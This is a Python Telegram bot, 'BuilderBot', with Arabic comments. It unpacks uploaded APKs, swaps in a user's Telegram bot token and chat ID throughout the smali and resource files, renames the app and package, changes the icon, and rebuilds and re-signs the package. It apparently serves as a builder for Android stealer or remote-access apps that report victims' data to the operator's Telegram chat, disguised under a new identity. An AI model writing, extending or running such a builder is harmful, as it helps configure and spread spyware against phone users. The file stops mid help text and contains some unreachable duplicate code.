#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=====================================================================
 BuilderBot v1.0
 بوت تلجرام لبناء وحقن ملفات APK
 - حقن Telegram Bot Token + Chat ID داخل الـ APK
 - تغيير اسم التطبيق / الباكيج / الأيقونة
 - إعادة البناء + Zipalign + التوقيع (keystore)
 - يعمل على pella.app أو أي VPS بدون تثبيت حزم نظام
=====================================================================
"""

import asyncio
import io
import json
import logging
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import urllib.request
import zipfile
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from pathlib import Path

from telegram import (BotCommand, InlineKeyboardButton, InlineKeyboardMarkup,
                      InputFile, Update)
from telegram.constants import ParseMode
from telegram.error import BadRequest, Forbidden
from telegram.ext import (Application, CallbackQueryHandler, CommandHandler,
                          ContextTypes, MessageHandler, filters)

try:
    from PIL import Image
except ImportError:
    Image = None

# =====================================================================
# 1) الإعدادات  (كل حاجة من متغيرات البيئة)
# =====================================================================

from dotenv import load_dotenv
load_dotenv(Path(__file__).resolve().parent / ".env")

BOT_TOKEN   = os.getenv("BOT_TOKEN", "").strip()
ADMIN_IDS   = {int(x) for x in re.split(r"[,\s]+", os.getenv("ADMIN_IDS", "")) if x.strip().isdigit()}

BASE_DIR    = Path(__file__).resolve().parent
TOOLS_DIR   = Path(os.getenv("TOOLS_DIR", BASE_DIR / "tools"))
WORK_DIR    = Path(os.getenv("WORK_DIR",  BASE_DIR / "work"))
DB_PATH     = Path(os.getenv("DB_PATH",   BASE_DIR / "data" / "bot.db"))
KEYSTORE    = Path(os.getenv("KEYSTORE_PATH", BASE_DIR / "keys" / "builder.jks"))
KS_ALIAS    = os.getenv("KS_ALIAS", "builder")
KS_PASS     = os.getenv("KS_PASS", "builder123")
KS_KEYPASS  = os.getenv("KS_KEYPASS", KS_PASS)

JDK_DIR      = TOOLS_DIR / "jdk"
APKTOOL_JAR  = TOOLS_DIR / "apktool.jar"
SIGNER_JAR   = TOOLS_DIR / "uber-apk-signer.jar"

JDK_URL     = os.getenv("JDK_URL", "https://api.adoptium.net/v3/binary/latest/17/ga/linux/x64/jdk/hotspot/normal/eclipse")
APKTOOL_URL = os.getenv("APKTOOL_URL", "https://github.com/iBotPeaches/Apktool/releases/download/v2.11.1/apktool_2.11.1.jar")
SIGNER_URL  = os.getenv("SIGNER_URL", "https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar")

JAVA_XMX      = os.getenv("JAVA_XMX", "320m")          # لو الباقة صغيرة خليها 160m
MAX_CONCURRENT= int(os.getenv("MAX_CONCURRENT", "1"))
USE_AAPT2     = os.getenv("USE_AAPT2", "1") == "1"

# على Termux لازم نستخدم aapt2 بتاع النظام مش المدمج في apktool
AAPT2_BIN = os.getenv("AAPT2_BIN", "") or (shutil.which("aapt2") or "")
AAPT_BIN  = os.getenv("AAPT_BIN",  "") or (shutil.which("aapt")  or "")
AAPT_MODE = os.getenv("AAPT_MODE", "auto").lower()   # auto | aapt1 | aapt2

def aapt_flags(force_aapt1=False):
    # مهم: -a و --use-aapt2 مينفعش مع بعض
    if (force_aapt1 or AAPT_MODE == "aapt1") and AAPT_BIN:
        return ["-a", AAPT_BIN]
    if AAPT2_BIN and AAPT_MODE != "aapt1":
        return ["-a", AAPT2_BIN]
    if AAPT_BIN:
        return ["-a", AAPT_BIN]
    if USE_AAPT2 and AAPT_MODE != "aapt1":
        return ["--use-aapt2"]
    return []

def termux_check():
    if Path("/data/data/com.termux").exists():
        miss = [b for b in ("aapt2",) if not shutil.which(b)]
        if miss:
            log.warning("⚠️ Termux: ناقص " + ", ".join(miss) + " → نفّذ:  pkg install aapt2 aapt")
        else:
            log.info(f"✅ Termux aapt2: {AAPT2_BIN}")

MAX_CONCURRENT= int(os.getenv("MAX_CONCURRENT", "1"))
TG_MAX_MB     = int(os.getenv("TG_MAX_MB", "20"))      # حد Bot API للتحميل
FORCE_JOIN    = os.getenv("FORCE_JOIN", "").strip()    # مثال: @mychannel
COOLDOWN      = float(os.getenv("COOLDOWN", "4"))

logging.basicConfig(
    format="%(asctime)s | %(levelname)-7s | %(message)s",
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("builderbot")
logging.getLogger("httpx").setLevel(logging.WARNING)

for d in (TOOLS_DIR, WORK_DIR, DB_PATH.parent, KEYSTORE.parent):
    d.mkdir(parents=True, exist_ok=True)

BUILD_SEM = asyncio.Semaphore(MAX_CONCURRENT)
_last_cmd: dict = {}

# =====================================================================
# 2) أدوات مساعدة عامة
# =====================================================================

def esc(s) -> str:
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def human(n: int) -> str:
    for u in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.0f}{u}"
        n /= 1024
    return f"{n:.1f}TB"

def now() -> str:
    return datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

def run(cmd, cwd=None, timeout=2400, env=None) -> tuple:
    e = os.environ.copy()
    if env:
        e.update(env)
    try:
        p = subprocess.run(cmd, cwd=cwd, env=e, timeout=timeout,
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        return p.returncode, p.stdout.decode("utf-8", "replace")
    except subprocess.TimeoutExpired as ex:
        return 124, f"TIMEOUT after {timeout}s\n{ex.output or ''}"

def download(url: str, dest: Path, label: str = "") -> Path:
    dest.parent.mkdir(parents=True, exist_ok=True)
    tmp = dest.with_suffix(dest.suffix + ".part")
    for attempt in range(3):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "BuilderBot/1.0"})
            with urllib.request.urlopen(req, timeout=120) as r, open(tmp, "wb") as f:
                total = int(r.headers.get("Content-Length") or 0)
                got = 0
                while True:
                    chunk = r.read(1 << 20)
                    if not chunk:
                        break
                    f.write(chunk)
                    got += len(chunk)
                    if total and got % (20 << 20) < (1 << 20):
                        log.info(f"   ⬇ {label} {got*100//total}%")
            tmp.rename(dest)
            return dest
        except Exception as ex:
            log.warning(f"download {url} failed ({attempt+1}/3): {ex}")
            time.sleep(3)
    raise RuntimeError(f"فشل تحميل {url}")

# =====================================================================
# 3) تثبيت الأدوات (Java + apktool + signer) مرة واحدة
# =====================================================================

JAVA_BIN = None

def find_java():
    global JAVA_BIN
    if JAVA_BIN:
        return JAVA_BIN
    for cand in (os.getenv("JAVA_HOME", "") and Path(os.getenv("JAVA_HOME")) / "bin" / "java",
                 shutil.which("java"), JDK_DIR / "bin" / "java"):
        if cand and Path(cand).exists():
            JAVA_BIN = str(cand)
            return JAVA_BIN
    return None

def ensure_tools():
    global JAVA_BIN
    log.info("🔧 فحص الأدوات ...")

    if not find_java():
        log.info("☕ تحميل Java (JDK 17) ...")
        tar = TOOLS_DIR / "jdk.tar.gz"
        download(JDK_URL, tar, "JDK")
        tmp = TOOLS_DIR / "_jdk_extract"
        if tmp.exists():
            shutil.rmtree(tmp, ignore_errors=True)
        tmp.mkdir(parents=True)
        with tarfile.open(tar, "r:gz") as t:
            t.extractall(tmp)
        inner = next((p for p in tmp.iterdir() if (p / "bin" / "java").exists()), None)
        if not inner:
            raise RuntimeError("ملف الـ JDK غير سليم")
        if JDK_DIR.exists():
            shutil.rmtree(JDK_DIR, ignore_errors=True)
        shutil.move(str(inner), str(JDK_DIR))
        shutil.rmtree(tmp, ignore_errors=True)
        tar.unlink(missing_ok=True)
        os.chmod(JDK_DIR / "bin" / "java", 0o755)
        JAVA_BIN = str(JDK_DIR / "bin" / "java")
        log.info("✅ تم تثبيت Java")
    else:
        log.info(f"✅ Java موجود: {JAVA_BIN}")

    if not APKTOOL_JAR.exists():
        log.info("📦 تحميل apktool ...")
        download(APKTOOL_URL, APKTOOL_JAR, "apktool")
    if not SIGNER_JAR.exists():
        log.info("✍️ تحميل apk-signer ...")
        download(SIGNER_URL, SIGNER_JAR, "signer")

    keytool = Path(JAVA_BIN).parent / "keytool"
    if not KEYSTORE.exists() and keytool.exists():
        log.info("🔑 إنشاء keystore ...")
        rc, out = run([str(keytool), "-genkeypair", "-v",
                       "-keystore", str(KEYSTORE), "-alias", KS_ALIAS,
                       "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000",
                       "-storepass", KS_PASS, "-keypass", KS_KEYPASS,
                       "-storetype", "JKS",
                       "-dname", "CN=BuilderBot, OU=Mobile, O=BuilderBot, L=Cairo, C=EG"])
        if rc != 0:
            log.warning(f"keytool: {out[-400:]}")
    log.info("🚀 كل الأدوات جاهزة")

def java(args, timeout=2400, heap=None):
    if not find_java():
        raise RuntimeError("Java غير متاح")
    return run([JAVA_BIN, f"-Xmx{heap or JAVA_XMX}", f"-Xss4m", "-jar"] + args, timeout=timeout)

# =====================================================================
# 4) قاعدة البيانات
# =====================================================================

_db_lock = threading.Lock()

def db():
    c = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
    c.row_factory = sqlite3.Row
    return c

def db_init():
    with db() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users(
            uid INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            joined TEXT, last_active TEXT, builds INTEGER DEFAULT 0,
            banned INTEGER DEFAULT 0, def_token TEXT, def_chat TEXT, ks_path TEXT);
        CREATE TABLE IF NOT EXISTS jobs(
            id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, kind TEXT,
            name TEXT, status TEXT, created TEXT, log TEXT);
        CREATE TABLE IF NOT EXISTS settings(k TEXT PRIMARY KEY, v TEXT);
        """)

def q(sql, args=(), one=False):
    with _db_lock, db() as c:
        cur = c.execute(sql, args)
        rows = cur.fetchall()
        return (rows[0] if rows else None) if one else rows

def ex(sql, args=()):
    with _db_lock, db() as c:
        cur = c.execute(sql, args)
        c.commit()
        return cur.lastrowid

def get_user(uid: int):
    return q("SELECT * FROM users WHERE uid=?", (uid,), one=True)

def upsert_user(uid: int, username=None, first_name=None):
    u = get_user(uid)
    if not u:
        ex("INSERT INTO users(uid,username,first_name,joined,last_active) VALUES(?,?,?,?,?)",
           (uid, username, first_name, now(), now()))
    else:
        ex("UPDATE users SET username=?, first_name=?, last_active=? WHERE uid=?",
           (username, first_name, now(), uid))

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

def setting(k: str, default=None):
    r = q("SELECT v FROM settings WHERE k=?", (k,), one=True)
    return r["v"] if r else default

def set_setting(k: str, v):
    ex("INSERT INTO settings(k,v) VALUES(?,?) ON CONFLICT(k) DO UPDATE SET v=excluded.v", (k, str(v)))

# =====================================================================
# 5) محرّك الحقن
# =====================================================================

TOKEN_RE  = re.compile(r"(?<![\w:])(\d{8,11}:[A-Za-z0-9_\-]{30,45})(?![\w:])")
CONST_RE  = re.compile(r'(const-string(?:/jumbo)?\s+[vp]\d+,\s*")((?:[^"\\]|\\.)*)(")')
NUM_RE    = re.compile(r"^-?\d{6,15}$")

TOKEN_PH = {"BOTTOKEN", "TOKEN", "TELEGRAMTOKEN", "TGBOTTOKEN", "TGTOKEN", "YOURBOTTOKEN",
            "YOURTOKEN", "TOKENHERE", "BOTTOKENHERE", "ENTERTOKEN", "APITOKEN", "PUTTOKEN",
            "YOURTELEGRAMBOTTOKEN", "TELEGRAMBOTTOKEN", "BOTAPIKEY"}
CHAT_PH  = {"CHATID", "CHAT", "TELEGRAMCHATID", "TGCHATID", "YOURCHATID", "CHATIDHERE",
            "ADMINCHATID", "USERCHATID", "ENTERCHATID", "TELEGRAMID"}

TEXT_EXT = {".xml", ".smali", ".json", ".txt", ".properties", ".prop", ".cfg", ".ini",
            ".conf", ".config", ".yaml", ".yml", ".env", ".js", ".ts", ".html", ".csv"}
SKIP_NAMES = {"apktool.yml", "public.xml"}
SKIP_PH_PATHS = ("com/google/", "com/android/", "androidx/", "kotlin/", "kotlinx/", "com/squareup/")

def norm_key(k: str) -> str:
    return re.sub(r"[^A-Za-z0-9]", "", k).upper()

def is_token_key(k: str) -> bool:
    n = norm_key(k)
    if n in TOKEN_PH or n in CHAT_PH:
        return n in TOKEN_PH
    return ("TOKEN" in n and ("BOT" in n or "TG" in n or "TELEGRAM" in n)) or n in ("TOKEN",)

def is_chat_key(k: str) -> bool:
    n = norm_key(k)
    if n in TOKEN_PH:
        return False
    return "CHAT" in n

def iter_text_files(root: Path):
    for p in root.rglob("*"):
        if p.is_dir() or p.name in SKIP_NAMES:
            continue
        if p.suffix.lower() in TEXT_EXT and p.stat().st_size < 4 << 20:
            yield p

def _rel(p: Path, root: Path) -> str:
    try:
        return str(p.relative_to(root))
    except Exception:
        return str(p)

def _sub_token(text: str, token: str, rep: list, rel: str):
    def f(m):
        rep.append((rel, "token", m.group(1), token))
        return token
    return TOKEN_RE.sub(f, text)

def _handle_kv_text(text, token, chat_id, rep, rel, style):
    """style: xml | json | prop"""
    if style == "xml":
        pat = re.compile(r'(<string\s+name="([^"]+)"[^>]*>)(.*?)(</string>)', re.S)
    elif style == "json":
        pat = re.compile(r'("([A-Za-z0-9_\-\.]+)"\s*:\s*")((?:[^"\\]|\\.)*)(")')
    else:
        pat = re.compile(r'^([A-Za-z0-9_\-\.]+)\s*([=:])\s*(.*)$', re.M)

    def make(key_grp, pre_grp, val_grp, post_grp, is_json=False):
        def f(m):
            key = m.group(key_grp)
            val = m.group(val_grp).strip()
            new = None
            if is_token_key(key):
                if not TOKEN_RE.fullmatch(val) or TOKEN_RE.search(val):
                    if norm_key(val) in TOKEN_PH or not TOKEN_RE.fullmatch(val):
                        new = token
            elif is_chat_key(key):
                if norm_key(val) in CHAT_PH or NUM_RE.match(val):
                    new = chat_id
            if new and new != val:
                rep.append((rel, key, val, new))
                return m.group(0).replace(m.group(val_grp), new, 1)
            return m.group(0)
        return f

    if style == "xml":
        text = pat.sub(make(2, 1, 3, 4), text)
    elif style == "json":
        text = pat.sub(make(2, 1, 3, 4, True), text)
    else:
        def f(m):
            key, sep, val = m.group(1), m.group(2), m.group(3).strip()
            new = None
            if is_token_key(key) and not TOKEN_RE.fullmatch(val):
                new = token
            elif is_chat_key(key) and (norm_key(val) in CHAT_PH or NUM_RE.match(val)):
                new = chat_id
            if new and new != val:
                rep.append((rel, key, val, new))
                return f"{key}{sep}{new}"
            return m.group(0)
        text = pat.sub(f, text)
    return text

def _smali_token_ph(val: str) -> bool:
    n = norm_key(val)
    if n in TOKEN_PH and n != "TOKEN":
        return True
    return ("TOKEN" in n) and ("_" in val)

def _smali_chat_ph(val: str) -> bool:
    n = norm_key(val)
    if n in CHAT_PH and n != "CHAT":
        return True
    return ("CHAT" in n) and ("_" in val)

def _handle_smali(text, token, chat_id, rep, rel, allow_ph=True):
    has_token = False

    def f(m):
        nonlocal has_token
        pre, val, post = m.group(1), m.group(2), m.group(3)
        if TOKEN_RE.fullmatch(val):
            has_token = True
            rep.append((rel, "token", val[:18] + "..", token[:18] + ".."))
            return pre + token + post
        if allow_ph and _smali_token_ph(val):
            has_token = True
            rep.append((rel, "token-ph", val, token))
            return pre + token + post
        return m.group(0)

    text = CONST_RE.sub(f, text)

    if has_token:
        def g(m):
            pre, val, post = m.group(1), m.group(2), m.group(3)
            if _smali_chat_ph(val) and val != token:
                rep.append((rel, "chat-ph", val, chat_id))
                return pre + chat_id + post
            if allow_ph and NUM_RE.match(val) and (val.startswith("-") or len(val.lstrip("-")) >= 9):
                rep.append((rel, "chat-num", val, chat_id))
                return pre + chat_id + post
            return m.group(0)
        text = CONST_RE.sub(g, text)
    return text

    def f(m):
        nonlocal has_token
        pre, val, post = m.group(1), m.group(2), m.group(3)
        n = norm_key(val)
        if TOKEN_RE.fullmatch(val) or n in TOKEN_PH:
            has_token = True
            rep.append((rel, "const-string", val[:20] + "...", token[:20] + "..."))
            return pre + token + post
        return m.group(0)

    text = CONST_RE.sub(f, text)

    if has_token:
        def g(m):
            pre, val, post = m.group(1), m.group(2), m.group(3)
            if norm_key(val) in CHAT_PH or (NUM_RE.match(val) and (val.startswith("-") or len(val.lstrip("-")) >= 9)):
                rep.append((rel, "const-string", val, chat_id))
                return pre + chat_id + post
            return m.group(0)
        text = CONST_RE.sub(g, text)
    return text

def smart_inject(src: Path, token: str, chat_id: str, mode="auto", custom=None) -> list:
    rep: list = []

    if mode == "custom" and custom:
        for item in custom:
            fp = src / item["path"]
            if not fp.exists():
                continue
            txt = fp.read_text(encoding="utf-8", errors="replace")
            if item["old"] in txt:
                rep.append((item["path"], "custom", item["old"], item["new"]))
                fp.write_text(txt.replace(item["old"], item["new"]), encoding="utf-8")
        return rep

    for p in iter_text_files(src):
        rel = _rel(p, src)
        try:
            txt = p.read_text(encoding="utf-8", errors="replace")
        except Exception:
            continue
        orig = txt
        ext = p.suffix.lower()
        allow_ph = not rel.replace("\\", "/").startswith(SKIP_PH_PATHS)

        if mode in ("auto", "strings") and ext == ".xml" and "/values" in rel.replace("\\", "/"):
            txt = _handle_kv_text(txt, token, chat_id, rep, rel, "xml")
        elif mode in ("auto", "assets") and ext == ".json":
            txt = _handle_kv_text(txt, token, chat_id, rep, rel, "json")
        elif mode in ("auto", "assets") and ext in (".properties", ".prop", ".cfg", ".ini", ".conf", ".env"):
            txt = _handle_kv_text(txt, token, chat_id, rep, rel, "prop")

        if mode in ("auto", "smali") and ext == ".smali":
            txt = _handle_smali(txt, token, chat_id, rep, rel, allow_ph)
        else:
            txt = _sub_token(txt, token, rep, rel)

        if txt != orig:
            p.write_text(txt, encoding="utf-8", errors="replace")
    return rep

# =====================================================================
# 6) تعديلات الـ APK
# =====================================================================

def manifest_info(src: Path) -> dict:
    mf = src / "AndroidManifest.xml"
    info = {"package": "?", "version": "?", "min": "?", "target": "?", "label": "?", "perms": []}
    if not mf.exists():
        return info
    try:
        root = ET.parse(mf).getroot()
    except Exception:
        return info
    A = "{http://schemas.android.com/apk/res/android}"
    info["package"] = root.get("package", "?")
    info["version"] = f'{root.get(A+"versionName","?")} ({root.get(A+"versionCode","?")})'
    info["label"] = root.get(A + "label", "?")
    for u in root.findall("uses-sdk"):
        info["min"] = u.get(A + "minSdkVersion", "?")
        info["target"] = u.get(A + "targetSdkVersion", "?")
    for pm in root.findall("uses-permission"):
        n = pm.get(A + "name", "")
        if n:
            info["perms"].append(n.split(".")[-1])
    return info

def set_app_name(src: Path, name: str) -> bool:
    done = False
    for f in (src / "res").glob("values*/strings.xml"):
        t = f.read_text(encoding="utf-8", errors="replace")
        new = re.sub(r'(<string\s+name="app_name"[^>]*>)(.*?)(</string>)',
                     lambda m: m.group(1) + name + m.group(3), t, flags=re.S)
        if new != t:
            f.write_text(new, encoding="utf-8")
            done = True
    mf = src / "AndroidManifest.xml"
    if mf.exists():
        t = mf.read_text(encoding="utf-8", errors="replace")
        t2 = re.sub(r'(android:label=")([^"]+)(")', lambda m: m.group(1) + name + m.group(3), t, count=1)
        if t2 != t and "<" not in name:
            mf.write_text(t2, encoding="utf-8")
            done = True
    return done

ICON_SIZES = {"ldpi": 36, "mdpi": 48, "hdpi": 72, "xhdpi": 96,
              "xxhdpi": 144, "xxxhdpi": 192, "nodpi": 192, "anydpi": 192}

def set_icon(src: Path, img_bytes: bytes) -> int:
    if Image is None:
        return 0
    img = Image.open(io.BytesIO(img_bytes)).convert("RGBA")
    n = 0
    for folder in (src / "res").glob("mipmap*"):
        if not folder.is_dir():
            continue
        density = folder.name.split("-")[-1] if "-" in folder.name else "xxxhdpi"
        base = ICON_SIZES.get(density, 192)
        for f in folder.glob("ic_launcher*"):
            if f.suffix.lower() not in (".png", ".webp", ".jpg", ".jpeg"):
                continue
            size = base * 2 if "foreground" in f.name.lower() else base
            try:
                r = img.resize((size, size), Image.LANCZOS)
                if f.suffix.lower() == ".webp":
                    r.save(f, "WEBP", quality=95)
                else:
                    r.save(f, "PNG")
                n += 1
            except Exception as e:
                log.warning(f"icon {f}: {e}")
    return n

# =====================================================================
# 7) خط البناء الكامل
# =====================================================================

class Progress:
    def __init__(self, bot, chat_id, msg_id, loop):
        self.bot, self.chat_id, self.msg_id, self.loop = bot, chat_id, msg_id, loop
        self.last = 0.0
        self.t0 = time.time()
        self.lines = []

    def __call__(self, text, force=False):
        self.lines.append(f"{time.time()-self.t0:5.1f}s  {text}")
        if not force and time.time() - self.last < 1.5:
            return
        self.last = time.time()
        body = "\n".join(self.lines[-9:])
        fut = asyncio.run_coroutine_threadsafe(
            safe_edit(self.bot, self.chat_id, self.msg_id,
                      f"<b>⏳ جاري البناء...</b>\n<code>{esc(body)}</code>"), self.loop)
        try:
            fut.result(timeout=20)
        except Exception:
            pass
def sanitize_res_names(src: Path) -> int:
    n = 0

    pub = src / "res" / "values" / "public.xml"
    if pub.exists():
        t = pub.read_text(encoding="utf-8", errors="replace")
        t2 = re.sub(r'(name=")([^"]*)(")',
                    lambda m: m.group(1) + m.group(2).replace("$", "_") + m.group(3), t)
        if t2 != t:
            pub.write_text(t2, encoding="utf-8")
            n += 1

    for f in list((src / "res").rglob("*")):
        if f.is_file() and "$" in f.name:
            f.rename(f.with_name(f.name.replace("$", "_")))
            n += 1

    for f in (src / "res").rglob("*.xml"):
        if f.name == "public.xml":
            continue
        t = f.read_text(encoding="utf-8", errors="replace")
        t2 = re.sub(r'@(\w+)/(\$[A-Za-z0-9_.]+)',
                    lambda m: "@" + m.group(1) + "/" + m.group(2).replace("$", "_"), t)
        if t2 != t:
            f.write_text(t2, encoding="utf-8")
            n += 1

    for sm in src.glob("smali*"):
        if not sm.is_dir():
            continue
        for f in sm.rglob("*.smali"):
            t = f.read_text(encoding="utf-8", errors="replace")
            if "->$" not in t:
                continue
            t2 = re.sub(r'->\$([A-Za-z0-9_]+)', r'->\1', t)
            if t2 != t:
                f.write_text(t2, encoding="utf-8")
                n += 1

    if pub.exists():
        pub.unlink()
        n += 1

    return n

def extract_errors(out: str, limit: int = 20) -> str:
    keys = ("error:", "Error:", "ERROR:", "invalid", "not found", "failed",
            "could not", "Exception", "W/ResourceType")
    seen, res = set(), []
    for l in out.splitlines():
        s = l.strip()
        if s and any(k in s for k in keys) and s not in seen:
            seen.add(s)
            res.append(s)
    return "\n".join(res[-limit:]) or out[-1200:]

def do_build(job: dict, prog: Progress) -> tuple:
    work = Path(tempfile.mkdtemp(prefix="build_", dir=str(WORK_DIR)))
    src = work / "src"
    out_apk = work / "unsigned.apk"
    logs = []
    try:
        apk_in = Path(job["apk_path"])
        prog(f"APK: {apk_in.name} ({human(apk_in.stat().st_size)})")

        prog("apktool d ...")
        cmd = [JAVA_BIN, f"-Xmx{JAVA_XMX}", "-jar", str(APKTOOL_JAR), "d", "-f", "-o", str(src)]
        cmd += aapt_flags()
        cmd.append(str(apk_in))
        rc, out = run(cmd, timeout=2400)
        logs.append(out[-4000:])
        if rc != 0 or not src.exists():
            return False, f"فشل فك الحزمة (apktool d) rc={rc}", "\n".join(logs)

        if job.get("app_name"):
            prog("rename app ...")
            set_app_name(src, job["app_name"])

        if job.get("icon_path") and Path(job["icon_path"]).exists():
            prog("icon ...")
            n = set_icon(src, Path(job["icon_path"]).read_bytes())
            prog(f"   icon files: {n}")

        prog("inject ...")
        rep = smart_inject(src, job["token"], job["chat_id"],
                           mode=job.get("mode", "auto"), custom=job.get("custom"))
        prog(f"   edits: {len(rep)}")
        if rep:
            logs.append("REPORT:\n" + "\n".join(str(r) for r in rep))
# --- إعادة البناء ---
        prog("🔨 إعادة البناء (apktool b) ...")
        built, rc, last_out = False, 1, ""

        plans = [(False, "aapt2")]
        if AAPT_BIN:
            plans.append((True, "aapt1"))

        def try_build(force1: bool, noc: bool = False):
            cmd = [JAVA_BIN, f"-Xmx{JAVA_XMX}", "-jar", str(APKTOOL_JAR), "b", str(src), "-o", str(out_apk)]
            cmd += aapt_flags(force_aapt1=force1)
            if noc:
                cmd.append("-nc")
            if job.get("package"):
                cmd += ["--rename-manifest-package", job["package"]]
            r, o = run(cmd, timeout=2400)
            logs.append(o[-4000:])
            ok = out_apk.exists() and zipfile.is_zipfile(out_apk) and out_apk.stat().st_size > 20000
            return ok, r, o

        for phase in (1, 2):
            if phase == 2:
                prog("🧹 تنظيف أسماء الريسورس ($) وحذف public.xml ...")
                try:
                    n = sanitize_res_names(src)
                    prog(f"   ↳ تم تعديل {n} عنصر")
                except Exception as e:
                    prog(f"   ↳ تحذير: {e}")
            for f1, label in plans:
                prog(f"   ↳ محاولة ({label}{' + no-crunch' if phase == 2 else ''}) ...")
                built, rc, last_out = try_build(f1, noc=(phase == 2))
                if built:
                    break
            if built:
                break

        if not built:
            return False, f"فشل إعادة البناء (apktool b) rc={rc}\n{extract_errors(last_out)}", "\n".join(logs)

        prog("sign ...")
        out_dir = work / "signed"
        out_dir.mkdir(exist_ok=True)
        cmd = [JAVA_BIN, f"-Xmx{JAVA_XMX}", "-jar", str(SIGNER_JAR),
               "-a", str(out_apk), "-o", str(out_dir), "--allowResign", "--overwrite"]
        if job.get("ks_path") and Path(job["ks_path"]).exists():
            cmd += ["--ks", job["ks_path"], "--ksAlias", job.get("ks_alias", KS_ALIAS),
                    "--ksPass", job.get("ks_pass", KS_PASS),
                    "--ksKeyPass", job.get("ks_keypass", job.get("ks_pass", KS_PASS))]
        elif KEYSTORE.exists():
            cmd += ["--ks", str(KEYSTORE), "--ksAlias", KS_ALIAS,
                    "--ksPass", KS_PASS, "--ksKeyPass", KS_KEYPASS]
        else:
            cmd.append("--debug")
        rc, out = run(cmd, timeout=1200)
        logs.append(out[-2000:])

        signed = next((p for p in out_dir.glob("*.apk")), None)
        if not signed:
            return False, "فشل التوقيع", "\n".join(logs)

        final = WORK_DIR / "out" / f"{signed.stem}.apk"
        final.parent.mkdir(exist_ok=True)
        shutil.copy(signed, final)
        return True, str(final), "\n".join(logs)
    except Exception as e:
        return False, f"استثناء: {e}", "\n".join(logs)
    finally:
        shutil.rmtree(work, ignore_errors=True)

def sign_only(apk: Path) -> tuple:
    out_dir = apk.parent / "signed"
    out_dir.mkdir(exist_ok=True)
    cmd = [JAVA_BIN, f"-Xmx{JAVA_XMX}", "-jar", str(SIGNER_JAR), "-a", str(apk),
           "-o", str(out_dir), "--allowResign", "--overwrite"]
    if KEYSTORE.exists():
        cmd += ["--ks", str(KEYSTORE), "--ksAlias", KS_ALIAS,
                "--ksPass", KS_PASS, "--ksKeyPass", KS_KEYPASS]
    else:
        cmd.append("--debug")
    rc, out = run(cmd, timeout=900)
    signed = next((p for p in out_dir.glob("*.apk")), None)
    return (True, str(signed), out) if signed else (False, out, out)

def info_only(apk: Path) -> dict:
    tmp = Path(tempfile.mkdtemp(prefix="info_", dir=str(WORK_DIR)))
    try:
        cmd = [JAVA_BIN, f"-Xmx{JAVA_XMX}", "-jar", str(APKTOOL_JAR), "d", "-f", "-s", "-o", str(tmp / "d"), str(apk)]
        if USE_AAPT2:
            cmd.append("--use-aapt2")
            cmd += aapt_flags()
        run(cmd, timeout=900)
        info = manifest_info(tmp / "d")
        icons = [n for n in zipfile.ZipFile(apk).namelist() if "ic_launcher" in n and n.lower().endswith((".png", ".webp"))]
        info["icon"] = icons[0] if icons else None
        return info
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

# =====================================================================
# 8) واجهة البوت
# =====================================================================

async def safe_edit(bot, chat_id, msg_id, text, kb=None):
    try:
        await bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id,
                                    reply_markup=kb, parse_mode=ParseMode.HTML)
    except BadRequest as e:
        if "not modified" not in str(e).lower():
            log.debug(f"edit: {e}")
    except Exception:
        pass

def menu_kb(is_adm=False):
    rows = [
        [InlineKeyboardButton("🚀 بناء APK + حقن", callback_data="build")],
        [InlineKeyboardButton("📦 معلومات APK", callback_data="info"),
         InlineKeyboardButton("✍️ توقيع APK", callback_data="sign")],
        [InlineKeyboardButton("⚙️ الإعدادات", callback_data="settings"),
         InlineKeyboardButton("🔑 مفتاحي", callback_data="myks")],
        [InlineKeyboardButton("ℹ️ مساعدة", callback_data="help")],
    ]
    if is_adm:
        rows.append([InlineKeyboardButton("🛠️ لوحة الأدمن", callback_data="admin")])
    return InlineKeyboardMarkup(rows)

async def check_join(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> bool:
    if not FORCE_JOIN:
        return True
    try:
        m = await ctx.bot.get_chat_member(FORCE_JOIN, update.effective_user.id)
        if m.status in ("left", "kicked"):
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("📢 اشترك", url=f"https://t.me/{FORCE_JOIN.lstrip('@')}")],
                                       [InlineKeyboardButton("✅ تحققت", callback_data="recheck")]])
            await update.effective_message.reply_text(
                f"⚠️ لازم تشترك في {FORCE_JOIN} الأول.", reply_markup=kb)
            return False
    except Exception:
        return True
    return True

# ---------- /start ----------

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    upsert_user(u.id, u.username, u.first_name)
    if not await check_join(update, ctx):
        return
    txt = (
        f"👋 أهلاً <b>{esc(u.first_name)}</b>\n\n"
        "🤖 <b>BuilderBot</b> — بوت حقن التوكن و Chat ID جوه ملفات APK\n\n"
        "📌 <b>الخطوات:</b>\n"
        "1️⃣ اضغط «بناء APK + حقن»\n"
        "2️⃣ ابعت ملف APK أو رابط مباشر\n"
        "3️⃣ ابعت Bot Token و Chat ID\n"
        "4️⃣ استلم الـ APK جاهز وموقّع ✅\n\n"
        f"🆔 <code>{u.id}</code>"
    )
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML,
                                    reply_markup=menu_kb(is_admin(u.id)))

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    t = (
        "<b>📖 الأوامر</b>\n"
        "/start — القائمة\n"
        "/build — بدء بناء جديد\n"
        "/id — عرض Chat ID بتاعك\n"
        "/token — حفظ توكن افتراضي\n"
